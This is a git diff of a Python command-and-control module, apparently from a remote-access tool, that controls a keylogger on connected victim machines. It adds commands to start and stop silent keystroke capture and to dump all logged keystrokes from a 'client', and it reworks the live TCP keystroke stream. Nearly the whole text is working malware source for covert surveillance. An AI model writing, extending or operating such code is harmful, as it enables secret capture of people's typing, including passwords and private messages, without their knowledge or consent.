@@ -24,9 +24,11 @@ class Keylogger:
 
 -ls or --list : Displays all clients with their information.
 
---direct :
+--direct : 
+ 
+--start : 
 
---silencious :
+--stop : 
 
 --dump : 
 
@@ -50,9 +52,9 @@ class Keylogger:
     def directTcp(self):
         #Launches a thread to listen to keystrokes,
         #Send "\r\n" to signal the customer to stop the mod keylogger.
-        printColor("information", "[?] Press ctrl+z to return to MOD KEYLOGGER.\n\n")
-
-        if(CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb ][NB_SOCKET], "MOD_KEYLOGGER:direct_tcp")):
+        printColor("information", "[?] Press CTRL+c to return to MOD KEYLOGGER.\n\n")
+        Keylogger.status_directTcp = True
+        if(CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb][NB_SOCKET], "MOD_KEYLOGGER:direct_tcp")):
             
             recv_thread = threading.Thread(target=self.recvThread)
             recv_thread.start()
@@ -64,12 +66,27 @@ class Keylogger:
             except KeyboardInterrupt:
                 checker = False
             
- 
             Keylogger.status_directTcp = False
             recv_thread.join()
-            CheckConn().sendsafe(self.session_nb, Handler.dict_conn[self.session_nb ][NB_SOCKET], "\r\n")
+            CheckConn().sendsafe(self.session_nb, Handler.dict_conn[self.session_nb][NB_SOCKET], "\r\n")
             
             print("\n")
+        else:
+            printColor("error", "[-] Unable to send the KEYLOGER MOD to the customer.\n")
+
+    
+    def sendStartorStop(self, data):
+        if(CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb][NB_SOCKET], data)):
+            #CheckConn().recvcommand(Handler.dict_conn[self.session_nb][NB_SOCKET],4096)
+            printColor("successfully", "[+] The mod has been sent.")
+        else:
+            printColor("error", "[-] Unable to send the KEYLOGER MOD to the customer.\n")
+
+    
+    def dumpAllData(self):
+        if(CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb][NB_SOCKET], "MOD_KEYLOGGER:dump_all")):
+            print(CheckConn().recvcommand(Handler.dict_conn[self.session_nb][NB_SOCKET],4096))
+            printColor("successfully", "[+] The mod has been sent.")
         else:
             printColor("error", "[-] Unable to send the KEYLOGER MOD to the customer.\n")
 
@@ -77,29 +94,33 @@ class Keylogger:
     def main(self):
         
         printColor("help","\n[?] Run -b or --back to return to the SESSION MOD.")
-        printColor("help","\n[?] Run -h or --help to list the available commands.\n")
+        printColor("help","[?] Run -h or --help to list the available commands.\n")
         checker = True                                   
         while Handler.dict_conn[self.session_nb][NB_ALIVE] and checker:
-            terminal = str(input(str("keylogger")+">")).split()
+            terminal = str(input(str("keylogger")+">"))
+
+            if terminal == "-h" or terminal == "--help":
+                self.help()
             
-            for i in range(0,len(terminal)):   
-                try:
-                    if terminal[i] == "-h" or terminal[i] == "--help":
-                        self.help()
-                    
-                    elif terminal[i] == "-ls" or terminal[i] == "--list":
-                        printAllTarget()
+            elif terminal == "-ls" or terminal == "--list":
+                printAllTarget()
 
-                    elif terminal[i] == "--direct":
-                        self.directTcp()
+            elif terminal == "--direct":
+                self.directTcp()
 
-                    elif terminal[i] == "-b" or terminal[i] == "--back":
-                        checker = False
-                    
-                    else:
-                        pass
+            elif terminal == "--start":
+                self.sendStartorStop("MOD_KEYLOGGER:start_silencious")
+            
+            elif terminal == "--stop":
+                self.sendStartorStop("MOD_KEYLOGGER:stop_silencious")
 
-                except IndexError:
-                    pass
+            elif terminal == "--dump":
+                self.dumpAllData()
+
+            elif terminal == "-b" or terminal == "--back":
+                checker = False
+            
+            else:
+                pass
 
         
